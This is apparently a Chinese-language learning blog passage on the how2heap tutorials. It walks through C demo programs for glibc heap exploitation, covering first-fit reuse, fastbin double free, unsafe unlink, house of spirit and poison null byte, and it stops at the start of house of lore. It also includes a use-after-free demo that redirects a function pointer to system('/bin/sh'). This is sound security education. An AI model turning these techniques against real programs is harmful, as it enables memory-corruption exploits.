---
title: 【PWN】how2heap
---

how2heap是由shellphish团队制作的堆利用教程，介绍了多种堆利用技术，后续系列实验我们就通过这个教程来学习。

## first_fit                                

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main()
{
    fprintf(stderr, "尽管这个例子没有演示攻击效果，但是它演示了 glibc 的分配机制\n");
    fprintf(stderr, "glibc 使用首次适应算法选择空闲的堆块\n");
    fprintf(stderr, "如果有一个空闲堆块且足够大，那么 malloc 将选择它\n");
    fprintf(stderr, "如果存在 use-after-free 的情况那可以利用这一特性\n");

    fprintf(stderr, "首先申请两个比较大的 chunk\n");
    char* a = malloc(0x512);
    char* b = malloc(0x256);
    char* c;

    fprintf(stderr, "第一个 a = malloc(0x512) 在: %p\n", a);
    fprintf(stderr, "第二个 b = malloc(0x256) 在: %p\n", b);
    fprintf(stderr, "我们可以继续分配\n");
    fprintf(stderr, "现在我们把 \"AAAAAAAA\" 这个字符串写到 a 那里 \n");
    strcpy(a, "AAAAAAAA");
    fprintf(stderr, "第一次申请的 %p 指向 %s\n", a, a);

    fprintf(stderr, "接下来 free 掉第一个...\n");
    free(a);

    fprintf(stderr, "接下来只要我们申请一块小于 0x512 的 chunk，那就会分配到原本 a 那里: %p\n", a);

    c = malloc(0x500);
    fprintf(stderr, "第三次 c = malloc(0x500) 在: %p\n", c);
    fprintf(stderr, "我们这次往里写一串 \"CCCCCCCC\" 到刚申请的 c 中\n");
    strcpy(c, "CCCCCCCC");
    fprintf(stderr, "第三次申请的 c %p 指向 %s\n", c, c);
    fprintf(stderr, "第一次申请的 a %p 指向 %s\n", a, a);
    fprintf(stderr, "可以看到，虽然我们刚刚看的是 a 的，但它的内容却是 \"CCCCCCCC\"\n");
}
```

这个程序并不展示如何攻击，而是展示glibc的一种分配规则。glibc 使用一种first-fit算法去选择一个free-chunk。如果存在一个free-chunk并且足够大的话，malloc会优先选取这个chunk。这种机制就可以在被利用于use after free(简称 uaf) 的情形中.

使用命令`gcc -g first_fit.c -o first_fit`编译，-g参数会保留代码的文字信息，便于调试。

运行一下看看

![image-20211226155444162](/images/heap/image-20211226155444162.png)

   程序展示了一个 glibc 堆分配策略，first-fit。在分配内存时，malloc 先到 unsorted bin（或者 fastbins）中查找适合的被 free 的 chunk，如果没有，就会把 unsorted bin 中的所有 chunk 分别放入到所属的 bins 中，然后再去这些 bins 里去寻找适合的 chunk。可以看到第三次 malloc 的地址和第一次相同，即 malloc 找到了第一次 free 掉的 chunk，并把它重新分配。

​    下断点，对着源码调试着理解一下

​    先是malloc了两次，第一个堆块的内容为“AAAAAAAA”对应0x41414141…，第二个堆块的内容为“BBBBBBBB”，对应0x42424242…。

 ![image-20211226155500389](/images/heap/image-20211226155500389.png)

然后free了a，这时候a被放到了unsorted bin中。

 ![image-20211226155518541](/images/heap/image-20211226155518541.png)	

​    然后再去申请一个小于free chunk的大小的内存空间，根据first fit就会分配到这里。可以发现，当释放了一块内存之后再去申请一个大小略小的空间，那么glibc倾向于将先前释放的空间重新分配。

 ![image-20211226155527427](/images/heap/image-20211226155527427.png)

​    加上参数重新编译一个版本：gcc -fsanitize=address -g first_fit.c，会提示有个 use-after-free 漏洞

 ![image-20211226155533401](/images/heap/image-20211226155533401.png)

​    UAF 漏洞简单来说就是第一次申请的内存释放之后，没有进行内存回收，下次申请的时候还能申请到这一块内存，导致我们可以用以前的内存指针来访问修改过的内存。

​    来看一下一个简单的 UAF 的利用的例子。

 ```c
 #include <stdio.h>
 #include <stdlib.h>
 typedef void (*func_ptr)(char *);
 void evil_fuc(char command[])
 {
     system(command);
 }
 void echo(char content[])
 {
     printf("%s",content);
 }
 int main()
 {
     func_ptr *p1=(func_ptr*)malloc(0x20);
     printf("申请了4个int大小的内存");
     printf("p1 的地址: %p\n",p1);
     p1[1]=echo;
     printf("把p1[1]赋值为echo函数，然后打印出\"hello world\"");
     p1[1]("hello world\n");
     printf("free 掉 p1");
     free(p1); 
     printf("因为并没有置为null，所以p1[1]仍然是echo函数，仍然可以输出打印了\"hello again\"");
     p1[1]("hello again\n");
     printf("接下来再去malloc一个p2，会把释放掉的p1给分配出来，可以看到他俩是同一地址的");
     func_ptr *p2=(func_ptr*)malloc(0x20);
     printf("p2 的地址: %p\n",p2);
     printf("p1 的地址: %p\n",p1);
     printf("然后把p2[1]给改成evil_fuc也就是system函数");
     p2[1]=evil_fuc;
     printf("传参调用");
     p1[1]("/bin/sh");
     return 0;
 }
 ```

​    依然使用之前的编译命令，然后动态调试看一下，首先申请了一个chunk，把那个p1[1]改成了echo函数的地址。

 ![image-20211226155616317](/images/heap/image-20211226155616317.png)

​    free掉之后再申请一个大小相同的p2，这时候会把之前p1的内存区域分配给p2，也就是说可以用p2来控制p1的内容了

 ![image-20211226155627689](/images/heap/image-20211226155627689.png)

## fastbin_dup

   fastbin主要是用来放一些小的内存的，来提高效率。源码如下

 ```c
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 
 int main()
 {
     fprintf(stderr, "这个例子演示了 fastbin 的 double free\n");
 
     fprintf(stderr, "首先申请了 3 个 chunk\n");
     char* a = malloc(8);
     strcpy(a, "AAAAAAAA");
     char* b = malloc(8);
     strcpy(b, "BBBBBBBB");
     char* c = malloc(8);
     strcpy(c, "CCCCCCCC");
 
     fprintf(stderr, "第一个 malloc(8): %p\n", a);
     fprintf(stderr, "第二个 malloc(8): %p\n", b);
     fprintf(stderr, "第三个 malloc(8): %p\n", c);
 
     fprintf(stderr, "free 掉第一个\n");
     free(a);
 
     fprintf(stderr, "当我们再次 free %p 的时候, 程序将会崩溃因为 %p 在 free 链表的第一个位置上\n", a, a);
     // free(a);
     fprintf(stderr, "我们先 free %p.\n", b);
     free(b);
 
     fprintf(stderr, "现在我们就可以再次 free %p 了, 因为他现在不在 free 链表的第一个位置上\n", a);
     free(a);
     fprintf(stderr, "现在空闲链表是这样的 [ %p, %p, %p ]. 如果我们 malloc 三次, 我们会得到两次 %p \n", a, b, a, a);
     
     char* d = malloc(8);
     char* e = malloc(8);
     char* f = malloc(8);
     strcpy(d, "DDDDDDDD");
     strcpy(e, "EEEEEEEE");
     strcpy(f, "FFFFFFFF");
     fprintf(stderr, "第一次 malloc(8): %p\n", d);
     fprintf(stderr, "第二次 malloc(8): %p\n", e);
     fprintf(stderr, "第三次 malloc(8): %p\n", f);
 }
 ```

​    这个程序更具体地展示了上一个程序所介绍的技巧，通过欺骗 malloc 来返回一个我们可控的区域的指针(在这个例子中，我们可以返回一个栈指针)。

   ```sh
    gcc -g fastbin_dup.c -o fastbin_dup
   ```

 ![image-20211226155703337](/images/heap/image-20211226155703337.png)

可以看到首先分配三块内存，当free掉第一块内存之后，再free一次该内存块是不行的，因为这时候这块内存刚好在对应的free-list的顶部，再次free这块内存就会被检查到，这里就free第二块内存。现在我们再次free第一块内存，因为它已经不在链表顶部了。

这时候的 free-list 有这三块内存 [0x2502010, 0x2502030, 0x2502010]，如果我们malloc三次的话，就会得到0x2502010两次。

使用pwndbg逐步调试，首先malloc 3个chunk。

 ![image-20211226155730619](/images/heap/image-20211226155730619.png)

第一个free之后，chunk a被添加到fastbins中。

 ![image-20211226155736358](/images/heap/image-20211226155736358.png)

第二个 free 之后，chunk b 被添加到fastbins中，可以看到在b的fd指针那里已经改成了chunk a的地址了。

 ![image-20211226155742407](/images/heap/image-20211226155742407.png)

   此时，由于chunk a处于bin中第2块的位置，不会被double-free的检查机制检查出来，所以第三个free之后，chunk a再次被添加到fastbins 中。chunk a和chunk b形成了一个环

 ![image-20211226155750568](/images/heap/image-20211226155750568.png)

   最后再malloc三块内存d、e、f，可以看到0x4444444444444444被改成了 0x4646464646464646，是因为后来申请的 f 跟 d 指向同一块内存区域。

 ![image-20211226155758366](/images/heap/image-20211226155758366.png)

   总结一下，程序展示了fastbins的double-free攻击，可以泄露出一块已经被分配的内存指针。fastbins 可以看成一个后进先出的栈，使用单链表来实现，通过fastbin->fd来遍历。由于free的过程会对free list做检查，我们不能连续两次free同一个chunk，所以这里在两次free 之间，增加了一次对其他chunk的free 过程，从而绕过了检查顺利执行，然后再malloc三次，就在同一个地址malloc了两次，也就有了两个指向同一块内存区域的指针。

## fastbin_dup_into_stack

​    这个程序更具体地展示了上一个程序所介绍的技巧，通过欺骗malloc 来返回一个我们可控的区域的指针 (在这个例子中，我们可以返回一个栈指针)

​    源码如下。

 ```c
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 
 int main()
 {
     fprintf(stderr, "这个例子拓展自 fastbin_dup.c，通过欺骗 malloc 使得返回一个指向受控位置的指针（本例为栈上）\n");
     unsigned long long stack_var;
 
     fprintf(stderr, "我们想通过 malloc 申请到 %p.\n", 8+(char *)&stack_var);
 
     fprintf(stderr, "先申请3 个 chunk\n");
     char* a = malloc(8);
     strcpy(a, "AAAAAAAA");
     char* b = malloc(8);
     strcpy(b, "BBBBBBBB");
     char* c = malloc(8);
     strcpy(c, "CCCCCCCC");
     
     fprintf(stderr, "chunk a: %p\n", a);
     fprintf(stderr, "chunk b: %p\n", b);
     fprintf(stderr, "chunk c: %p\n", c);
 
     fprintf(stderr, "free 掉 chunk a\n");
     free(a);
 
     fprintf(stderr, "如果还对 %p 进行 free, 程序会崩溃。因为 %p 现在是 fastbin 的第一个\n", a, a);
     // free(a);
     fprintf(stderr, "先对 b %p 进行 free\n", b);
     free(b);
 
     fprintf(stderr, "接下来就可以对 %p 再次进行 free 了, 现在已经不是它在 fastbin 的第一个了\n", a);
     free(a);
 
     fprintf(stderr, "现在 fastbin 的链表是 [ %p, %p, %p ] 接下来通过修改 %p 上的内容来进行攻击.\n", a, b, a, a);
     unsigned long long *d = malloc(8);
 
     fprintf(stderr, "第一次 malloc(8): %p\n", d);
     char* e = malloc(8);
     strcpy(e, "EEEEEEEE");
     fprintf(stderr, "第二次 malloc(8): %p\n", e);
     fprintf(stderr, "现在 fastbin 表中只剩 [ %p ] 了\n", a);
     fprintf(stderr, "接下来往 %p 栈上写一个假的 size，这样 malloc 会误以为那里有一个空闲的 chunk，从而申请到栈上去\n", a);
     stack_var = 0x20;
 
     fprintf(stderr, "现在覆盖 %p 前面的 8 字节，修改 fd 指针指向 stack_var 前面 0x20 的位置\n", a);
     *d = (unsigned long long) (((char*)&stack_var) - sizeof(d));
     
     char* f = malloc(8);
     strcpy(f, "FFFFFFFF");
     fprintf(stderr, "第三次 malloc(8): %p, 把栈地址放到 fastbin 链表中\n", f);
     char* g = malloc(8);
     strcpy(g, "GGGGGGGG");
     fprintf(stderr, "这一次 malloc(8) 就申请到了栈上去: %p\n", g);
 }
 ```

​    gcc -g fastbin_dup_into_stack.c -o fastbin_dup_into_stack

​    这个程序展示了怎样通过修改fd指针，将其指向一个伪造的free chunk，在伪造的地址处malloc出一个chunk。该程序大部分内容都和上一个程序一样，漏洞也同样是double-free，只有给 fd 填充的内容不一样。

​    三次malloc之后

 ![image-20211226155926302](/images/heap/image-20211226155926302.png)

​    三次 free 之后，可以看到由于 double free 造成的循环的指针。

 ![image-20211226155932756](/images/heap/image-20211226155932756.png)

​    这时候我们再去malloc两次，还剩一个指向chunk a的free chunk，而前面我们也申请到了指向它的 chunk d，可以通过它编辑chunk a的fd 指针，填充一个有意义的地址：栈地址减0x8（因为伪造的chunk要有个 size，size在&stack_var - 0x8的位置上）

​    `*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));`

   通过调试我们可以看到，地址为``0x603000``的``chunk``的``fd``指针指向的是栈上的地址，这样的话，malloc一次之后再次申请的时候就会申请到fd指针指向的0x7fffffffdac0

 ![image-20211226155944925](/images/heap/image-20211226155944925.png)

最后可以看到我们已经分配栈上的内存，并写入了数据GGGGGGGG。

 ![image-20211226155950519](/images/heap/image-20211226155950519.png)

## fastbin_dup_consolidate

这个程序展示了利用在large bin的分配中malloc_consolidate 机制绕过 fastbin对double free的检查，这个检查在 fastbin_dup中已经展示过了，只不过它利用的是在两次 free 中间插入一次对其它chunk的free。

​    源码如下。

 ```c
 #include <stdio.h>
 #include <stdint.h>
 #include <stdlib.h>
 #include <string.h>
 
 int main() {
     void* p1 = malloc(0x10);
     strcpy(p1, "AAAAAAAA");
     void* p2 = malloc(0x10);
     strcpy(p2, "BBBBBBBB");
     fprintf(stderr, "申请两个 fastbin 范围内的 chunk: p1=%p p2=%p\n", p1, p2);
     fprintf(stderr, "先 free p1\n");
     free(p1);
     void* p3 = malloc(0x400);
     fprintf(stderr, "去申请 largebin 大小的 chunk，触发 malloc_consolidate(): p3=%p\n", p3);
     fprintf(stderr, "因为 malloc_consolidate(), p1 会被放到 unsorted bin 中\n");
     free(p1);
     fprintf(stderr, "这时候 p1 不在 fastbin 链表的头部了，所以可以再次 free p1 造成 double free\n");
     void* p4 = malloc(0x10);
     strcpy(p4, "CCCCCCC");
     void* p5 = malloc(0x10);
     strcpy(p5, "DDDDDDDD");
     fprintf(stderr, "现在 fastbin 和 unsortedbin 中都放着 p1 的指针，所以我们可以 malloc 两次都到 p1: %p %p\n", p4, p5);
 }
 ```

​    运行结果。

 ![image-20211226160121021](/images/heap/image-20211226160121021.png)

​    首先分配两个fastbin范围内的chunk。

 ![image-20211226160125949](/images/heap/image-20211226160125949.png)

​    释放掉p1，则空闲的chunk进入fastbin

 ![image-20211226160131326](/images/heap/image-20211226160131326.png)

​    此时如果我们再次释放 p1，必然触发 double free 异常，然而，如果此时分配一个 large chunk，效果如下：

 ![image-20211226160140067](/images/heap/image-20211226160140067.png)

   可以看到 fastbins 中的 chunk 已经不见了，反而出现在了 small bins 中，并且 chunk p2 的 prev_size 和 size 字段都被修改。

​    看一下large chunk的分配过程：

 ```c
 /*
      If this is a large request, consolidate fastbins before continuing.
      While it might look excessive to kill all fastbins before
      even seeing if there is space available, this avoids
      fragmentation problems normally associated with fastbins.
      Also, in practice, programs tend to have runs of either small or
      large requests, but less often mixtures, so consolidation is not
      invoked all that often in most programs. And the programs that
      it is called frequently in otherwise tend to fragment.
    */
 else
 {
       idx = largebin_index (nb);
 if(have_fastchunks (av))
         malloc_consolidate (av);
 }
 ```

   在分配large chunk的时候，首先会根据chunk的大小来获取对应的 large bin的index，然后判断fast bins中有没有chunk，如果有就调用 malloc_consolidate()合并fast bins中的chunk，然后放到unsorted bin 中。unsorted bin中的chunk 会按照大小放到small或large bins中

   p1已经不再fastbin的顶部，所以可以再次free。那么p1再次被free之后既在small bins又在fast bins。

 ![image-20211226160221154](/images/heap/image-20211226160221154.png)

  再一次 malloc 之后会从 fast bins 中分配

  void *p4 = malloc(0x10);

  strcpy(p4, "CCCCCCC");

​    可以看到堆块被写入了CCCCCCC。

 ![image-20211226160227519](/images/heap/image-20211226160227519.png)

  再一次就是从 small bins 中分配

  void *p5 = malloc(0x10);

  strcpy(p5, "DDDDDDDD");

 ![image-20211226160239815](/images/heap/image-20211226160239815.png)

​    可以看到堆块的内容被覆盖成DDDDDDDD了，这是因为p4和p5被分配在了同一个地方，修改p5处的内容其实就是修改p4处的内容。

## unsafe_unlink

       ```c
       #include <stdio.h>
       #include <stdlib.h>
       #include <string.h>
       #include <stdint.h>
       
       uint64_t *chunk0_ptr;
       
       int main()
       {
           fprintf(stderr, "当您在已知位置有指向某个区域的指针时，可以调用 unlink\n");
           fprintf(stderr, "最常见的情况是易受攻击的缓冲区，可能会溢出并具有全局指针\n");
       
           int malloc_size = 0x80; //要足够大来避免进入 fastbin
           int header_size = 2;
       
           fprintf(stderr, "本练习的重点是使用 free 破坏全局 chunk0_ptr 来实现任意内存写入\n\n");
       
           chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
           uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
           fprintf(stderr, "全局变量 chunk0_ptr 在 %p, 指向 %p\n", &chunk0_ptr, chunk0_ptr);
           fprintf(stderr, "我们想要破坏的 chunk 在 %p\n", chunk1_ptr);
       
           fprintf(stderr, "在 chunk0 那里伪造一个 chunk\n");
           fprintf(stderr, "我们设置 fake chunk 的 'next_free_chunk' (也就是 fd) 指向 &chunk0_ptr 使得 P->fd->bk = P.\n");
           chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
           fprintf(stderr, "我们设置 fake chunk 的 'previous_free_chunk' (也就是 bk) 指向 &chunk0_ptr 使得 P->bk->fd = P.\n");
           fprintf(stderr, "通过上面的设置可以绕过检查: (P->fd->bk != P || P->bk->fd != P) == False\n");
           chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
           fprintf(stderr, "Fake chunk 的 fd: %p\n",(void*) chunk0_ptr[2]);
           fprintf(stderr, "Fake chunk 的 bk: %p\n\n",(void*) chunk0_ptr[3]);
       
           fprintf(stderr, "现在假设 chunk0 中存在一个溢出漏洞，可以更改 chunk1 的数据\n");
           uint64_t *chunk1_hdr = chunk1_ptr - header_size;
           fprintf(stderr, "通过修改 chunk1 中 prev_size 的大小使得 chunk1 在 free 的时候误以为 前面的 free chunk 是从我们伪造的 free chunk 开始的\n");
           chunk1_hdr[0] = malloc_size;
           fprintf(stderr, "如果正常的 free chunk0 的话 chunk1 的 prev_size 应该是 0x90 但现在被改成了 %p\n",(void*)chunk1_hdr[0]);
           fprintf(stderr, "接下来通过把 chunk1 的 prev_inuse 改成 0 来把伪造的堆块标记为空闲的堆块\n\n");
           chunk1_hdr[1] &= ~1;
       
           fprintf(stderr, "现在释放掉 chunk1，会触发 unlink，合并两个 free chunk\n");
           free(chunk1_ptr);
       
           fprintf(stderr, "此时，我们可以用 chunk0_ptr 覆盖自身以指向任意位置\n");
           char victim_string[8];
           strcpy(victim_string,"Hello!~");
           chunk0_ptr[3] = (uint64_t) victim_string;
       
           fprintf(stderr, "chunk0_ptr 现在指向我们想要的位置，我们用它来覆盖我们的 victim string。\n");
           fprintf(stderr, "之前的值是: %s\n",victim_string);
           chunk0_ptr[0] = 0x4141414142424242LL;
           fprintf(stderr, "新的值是: %s\n",victim_string);
       }
       ```

​    这个程序展示了怎样利用 free 改写全局指针 chunk0_ptr 达到任意内存写的目的，即unsafe unlink。

​    运行一下看看

 ![image-20211226160617741](/images/heap/image-20211226160617741.png)

​    unlink有一个保护检查机制，在解链操作之前，针对堆块P自身的fd和bk 检查了链表的完整性，即判断堆块P的前一块fd的指针是否指向P，以及后一块bk的指针是否指向 P。

​    malloc_size设置为0x80，可以分配small chunk，然后定义header_size为2。申请两块空间，全局指针chunk0_ptr指向chunk0，局部指针chunk1_ptr 指向 chunk1。先在main函数上设置一个断点，然后单步走下一步，走到20行。

​    我们来看一下，申请了两个堆之后的情况。

 ![image-20211226160623260](/images/heap/image-20211226160623260.png)

 ![image-20211226160627911](/images/heap/image-20211226160627911.png)

接下来要绕过 (P->fd->bk != P || P->bk->fd != P) == False的检查，这个检查有个缺陷，就是fd/bk指针都是通过与chunk头部的相对地址来查找的，所以我们可以利用全局指针chunk0_ptr构造fake chunk来绕过它。

再单步走到40行。

 ![image-20211226160633284](/images/heap/image-20211226160633284.png)

​    可以看到，我们在chunk0里构造一个fake chunk，用P表示，两个指针fd 和bk可以构成两条链：P->fd->bk == P，P->bk->fd == P，可以绕过检查。另外利用chunk0的溢出漏洞，通过修改chunk 1的 prev_size为fake chunk的大小，修改 PREV_INUSE标志位为0，将fake chunk伪造成一个free chunk。

 ![image-20211226160638657](/images/heap/image-20211226160638657.png)

​    我们的fake chunk的fd指向0x602058，然后0x602058的bk指向0x602070。fake chunk的bk指向0x602060，然后0x602060的fd指向 0x602070，可以保证前后都指向我们伪造的这个 chunk，完美！

​    接下来释放掉chunk1，因为fake chunk和chunk1是相邻的一个free chunk，所以会将他两个合并，这就需要对fake chunk进行unlink，进行如下操作：

 ```c
 FD = P->fd
 BK = P->bk
 FD->bk = BK
 BK->fd = FD
 ```

​    根据 fd 和 bk 指针在 malloc_chunk 结构体中的位置，这段代码等价于：

 ```c
 FD = P->fd = &P - 24
 BK = P->bk = &P - 16
 FD->bk = *(&P - 24 + 24) = P
 FD->fd = *(&P - 16 + 16) = P
 ```

这样就通过了 unlink 的检查，最终效果为：

 ```c
 FD->bk = P = BK = &P - 16
 BK->fd = P = FD = &P - 24
 ```

​    也就是说，chunk0_ptr 和 chunk0_ptr[3] 现在指向的是同一个地址

 ![image-20211226160743336](/images/heap/image-20211226160743336.png)

   在这个图示中最终实现的效果是ptr中存的是ptr-0x18，如果本来ptr 是存的一个指针的，现在它指向了ptr-0x18。如果编辑这里的内容就可以往ptr-0x18那里去写，实现了覆盖这个指针为任意值的效果。

## house_of_spirit

   house_of_spirit是一种fastbins攻击方法，通过构造fake chunk，然后将其free掉，就可以在下一次malloc时返回fake chunk的地址，即任意我们可控的区域。House_of_spirit是一种通过堆的fast bin机制来辅助栈溢出的方法，一般的栈溢出漏洞的利用都希望能够覆盖函数的返回地址以控制EIP来劫持控制流，但如果栈溢出的长度无法覆盖返回地址，同时却可以覆盖栈上的一个即将被free的堆指针，此时可以将这个指针改写为栈上的地址并在相应位置构造一个fast bin块的元数据，接着在free操作时，这个栈上的堆块被放到fast bin中，下一次malloc对应的大小时，由于fast bin的先进后出机制，这个栈上的堆块被返回给用户，再次写入时就可能造成返回地址的改写。所以利用的第一步不是去控制一个 chunk，而是控制传给 free 函数的指针，将其指向一个fake chunk。所以 fake chunk的伪造是关键。

   源码如下。

 ```c
 #include <stdio.h>
 #include <stdlib.h>
 
 int main()
 {
     fprintf(stderr, "这个例子演示了 house of spirit 攻击\n");
 
     fprintf(stderr, "我们将构造一个 fake chunk 然后释放掉它，这样再次申请的时候就会申请到它\n");
     malloc(1);
 
     fprintf(stderr, "覆盖一个指向 fastbin 的指针\n");
     unsigned long long *a, *b;
     unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));
 
     fprintf(stderr, "这块区域 (长度为: %lu) 包含两个 chunk. 第一个在 %p 第二个在 %p.\n", sizeof(fake_chunks), &fake_chunks[1], &fake_chunks[9]);
 
     fprintf(stderr, "构造 fake chunk 的 size，要比 chunk 大 0x10（因为 chunk 头），同时还要保证属于 fastbin，对于 fastbin 来说 prev_inuse 不会改变，但是其他两个位需要注意都要位 0\n");
     fake_chunks[1] = 0x40; // size
 
     fprintf(stderr, "next chunk 的大小也要注意，要大于 0x10 小于 av->system_mem（128kb）\n");
         // 这是fake_chunks[?]可以数一下
     fake_chunks[9] = 0x1234; // nextsize
     fake_chunks[2] = 0x4141414141414141LL;
     fake_chunks[10] = 0x4141414141414141LL;
 
     fprintf(stderr, "现在，我们拿伪造的那个 fake chunk 的地址进行 free, %p.\n", &fake_chunks[2]);
     a = &fake_chunks[2];
 
     fprintf(stderr, "free!\n");
     free(a);
 
     fprintf(stderr, "现在 malloc 的时候将会把 %p 给返回回来\n", &fake_chunks[2]);
     b = malloc(0x30);
     fprintf(stderr, "malloc(0x30): %p\n", b);
     b[0] = 0x4242424242424242LL;
     fprintf(stderr, "ok!\n");
     return 0;
 }
 ```

    ```c
    gcc -g house_of_spirit.c -o house_of_spirit
    ```

​    首先在程序的第 14 行下个断点

  运行到这里可以看到 fake_chunk 目前还没有被我们写入。

 ![image-20211226160826730](/images/heap/image-20211226160826730.png)

   我们直接让他写完，再来看一下，已经构造出fake chunk了。

 ![image-20211226160833206](/images/heap/image-20211226160833206.png)

对fake chunk进行free之后。

 ![image-20211226160839557](/images/heap/image-20211226160839557.png)

可以看一下fastbin，现在已经有了我们构造的哪个fake chunk了。

 ![image-20211226160844417](/images/heap/image-20211226160844417.png)

   接下来再次malloc一个相同大小的chunk就会把fastbin中的fake chunk申请过去。

 ```c
 b = malloc(0x30);
 b[0] = 0x4242424242424242LL;
 ```

 ![image-20211226160849714](/images/heap/image-20211226160849714.png)

   伪造chunk时需要绕过一些检查，首先是标志位，`PREV_INUSE` 位并不影响 free的过程，但 `IS_MMAPPED` 位和 `NON_MAIN_ARENA` 位都要为零。其次，在64位系统中fast chunk的大小要在 32~128 字节之间。最后，是next chunk的大小，必须大于 `2*SIZE_SZ`（即大于16），小于 `av->system_mem`（即小于128kb），才能绕过对next chunk大小的检查。

​    所以house_of_spirit的主要目的是，当我们伪造的fake chunk内部存在不可控区域时，运用这一技术可以将这片区域变成可控的。上面为了方便观察，在 fake chunk里填充一些字母，但在现实中这些位置很可能是不可控的，而house_of_spirit也正是以此为目的而出现的。

## poison_null_byte

​    源码如下。

 ```c
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <stdint.h>
 #include <malloc.h>
 
 int main()
 {
     fprintf(stderr, "当存在 off by null 的时候可以使用该技术\n");
 
     uint8_t* a;
     uint8_t* b;
     uint8_t* c;
     uint8_t* b1;
     uint8_t* b2;
     uint8_t* d;
     void *barrier;
 
     fprintf(stderr, "申请 0x100 的 chunk a\n");
     a = (uint8_t*) malloc(0x100);
     fprintf(stderr, "a 在: %p\n", a);
     int real_a_size = malloc_usable_size(a);
     fprintf(stderr, "因为我们想要溢出 chunk a，所以需要知道他的实际大小: %#x\n", real_a_size);
 
     b = (uint8_t*) malloc(0x200);
     fprintf(stderr, "b: %p\n", b);
     c = (uint8_t*) malloc(0x100);
     fprintf(stderr, "c: %p\n", c);
 
     barrier =  malloc(0x100);
     fprintf(stderr, "另外再申请了一个 chunk c：%p，防止 free 的时候与 top chunk 发生合并的情况\n", barrier);
 
     uint64_t* b_size_ptr = (uint64_t*)(b - 8);
     fprintf(stderr, "会检查 chunk size 与 next chunk 的 prev_size 是否相等，所以要在后面一个 0x200 来绕过检查\n");
     *(size_t*)(b+0x1f0) = 0x200;
 
     free(b);
     
     fprintf(stderr, "b 的 size: %#lx\n", *b_size_ptr);
     fprintf(stderr, "假设我们写 chunk a 的时候多写了一个 0x00 在 b 的 size 的 p 位上\n");
     a[real_a_size] = 0; // <--- THIS IS THE "EXPLOITED BUG"
     fprintf(stderr, "b 现在的 size: %#lx\n", *b_size_ptr);
 
     uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2;
     fprintf(stderr, "c 的 prev_size 是 %#lx\n",*c_prev_size_ptr);
 
     fprintf(stderr, "但他根据 chunk b 的 size 找的时候会找到 b+0x1f0 那里，我们将会成功绕过 chunk 的检测 chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n",*((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8))));
     b1 = malloc(0x100);
 
     fprintf(stderr, "申请一个 0x100 大小的 b1: %p\n",b1);
     fprintf(stderr, "现在我们 malloc 了 b1 他将会放在 b 的位置，这时候 c 的 prev_size 依然是: %#lx\n",*c_prev_size_ptr);
     fprintf(stderr, "但是我们之前写 0x200 那个地方已经改成了: %lx\n",*(((uint64_t*)c)-4));
     fprintf(stderr, "接下来 malloc 'b2', 作为 'victim' chunk.\n");
 
     b2 = malloc(0x80);
     fprintf(stderr, "b2 申请在: %p\n",b2);
 
     memset(b2,'B',0x80);
     fprintf(stderr, "现在 b2 填充的内容是:\n%s\n",b2);
     fprintf(stderr, "现在对 b1 和 c 进行 free 因为 c 的 prev_size 是 0x210，所以会把他俩给合并，但是这时候里面还包含 b2 呐.\n");
 
     free(b1);
     free(c);
     
     fprintf(stderr, "这时候我们申请一个 0x300 大小的 chunk 就可以覆盖着 b2 了\n");
     d = malloc(0x300);
     fprintf(stderr, "d 申请到了: %p，我们填充一下 d 为 \"D\"\n",d);
     memset(d,'D',0x300);
     fprintf(stderr, "现在 b2 的内容就是:\n%s\n",b2);
 }
 ```

​    该技术适用的场景需要某个malloc的内存区域存在一个单字节溢出漏洞。通过溢出下一个chunk的size字段，攻击者能够在堆中创造出重叠的内存块，从而达到改写其他数据的目的。再结合其他的利用方式，同样能够获得程序的控制权。

​    编译完成之后，单步调试。首先申请了4个chunk，分别是a、b、c和一个防止与top chunk合并的chunk。

​     ![image-20211226160943389](/images/heap/image-20211226160943389.png)

​    接下来为了绕过size和next chunk的prev_size的检查，我们在chunk b的末尾伪造了一个0x200大小的prev_size

 ![image-20211226160947926](/images/heap/image-20211226160947926.png)

   然后把b给free掉，通过编辑chunk a来更改b的size的最后一位为0x00。

 ![image-20211226160952228](/images/heap/image-20211226160952228.png)

​     这时候c那里的prev_size还是之前的，因为更改了b的size，所以找的时候会找b + 0x200的，而真正的prev_size位在0x210处，也正是这样让我们绕过了chunksize(P) = prev_size(next_chunk(P))的检测。

   接下来申请一个0x100大小的chunk，因为b已经被free了，所以glibc会将b进行切割，分出一块0x100大小的堆块给b1，剩下0xf0。

 ![image-20211226160956897](/images/heap/image-20211226160956897.png)

   接下来再去申请一块小于0xf0的堆块，这样就会继续分割b剩下的那一块（我们把这次申请的堆块填充上’B’来区分）。

 ![image-20211226161002057](/images/heap/image-20211226161002057.png)

   接下来free掉b1和c，因为c的prev_size仍然是0x210，按照这个去找的话就可以找到原本的b，现在的b1的位置，那么他们俩会合并，但是中间还有个b2呢。这里how2heap有一个注释。

```c
Typically b2 (the victim) will be a structure with valuable pointers that we want to control
通常b2（受害者）将是一个结构，其中包含我们要控制的有价值的指针
```

 ![image-20211226161007121](/images/heap/image-20211226161007121.png)

   那么接下来的事情就是申请一块大的chunk，然后随便改写b2的内容了。

 ![image-20211226161037363](/images/heap/image-20211226161037363.png)

##  house_of_lore

​    源码如下。

 ```c
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <stdint.h>
 
 void jackpot(){ fprintf(stderr, "Nice jump d00d\n"); exit(0); }
 
 int main(int argc, char * argv[]){
 
   intptr_t* stack_buffer_1[4] = {0};
   intptr_t* stack_buffer_2[3] = {0};
   fprintf(stderr, "定义了两个数组");
   fprintf(stderr, "stack_buffer_1 在 %p\n", (void*)stack_buffer_1);
   fprintf(stderr, "stack_buffer_2 在 %p\n", (void*)stack_buffer_2);
 
   intptr_t *victim = malloc(100);
